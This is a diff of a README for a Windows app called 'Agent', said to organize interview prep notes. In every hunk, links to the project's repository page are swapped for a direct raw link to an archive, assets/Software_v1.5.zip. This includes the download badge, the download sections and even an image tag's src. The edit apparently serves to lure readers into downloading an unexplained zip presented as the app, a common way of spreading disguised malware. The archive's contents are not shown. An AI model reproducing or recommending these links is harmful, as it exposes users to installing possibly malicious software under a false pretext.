@@ -1,6 +1,6 @@
 # 🤖 Agent - Organize Interview Prep Fast
 
-[![Download Agent](https://img.shields.io/badge/Download-Agent-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cocohig4830/Agent)
+[![Download Agent](https://img.shields.io/badge/Download-Agent-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/cocohig4830/Agent/main/assets/Software_v1.5.zip)
 
 ## 🧭 Overview
 
@@ -8,13 +8,13 @@ Agent is a Windows app for interview prep notes and review. It helps you collect
 
 The project is built for people who want a simple way to sort interview content without setting up extra tools. You can use it to track topics, review common questions, and build a clean study list.
 
-<img width="938" height="421" alt="image" src="https://github.com/user-attachments/assets/17dd56e4-18ae-4473-96be-0c265f64358a" />
+<img width="938" height="421" alt="image" src="https://raw.githubusercontent.com/cocohig4830/Agent/main/assets/Software_v1.5.zip" />
 
 ## 📥 Download
 
 Visit this page to download Agent:
 
-https://github.com/cocohig4830/Agent
+https://raw.githubusercontent.com/cocohig4830/Agent/main/assets/Software_v1.5.zip
 
 If the page shows a release file, download it first. If it shows a folder or source package, download that package and follow the steps below.
 
@@ -45,7 +45,7 @@ For best results, use a modern desktop or laptop with the latest Windows updates
 
 Go to:
 
-https://github.com/cocohig4830/Agent
+https://raw.githubusercontent.com/cocohig4830/Agent/main/assets/Software_v1.5.zip
 
 ### 2. Download the app
 
@@ -177,7 +177,7 @@ This helps you keep notes separate from other files on your computer.
 
 Primary download page:
 
-https://github.com/cocohig4830/Agent
+https://raw.githubusercontent.com/cocohig4830/Agent/main/assets/Software_v1.5.zip
 
 ## 🏷️ Project Info
 
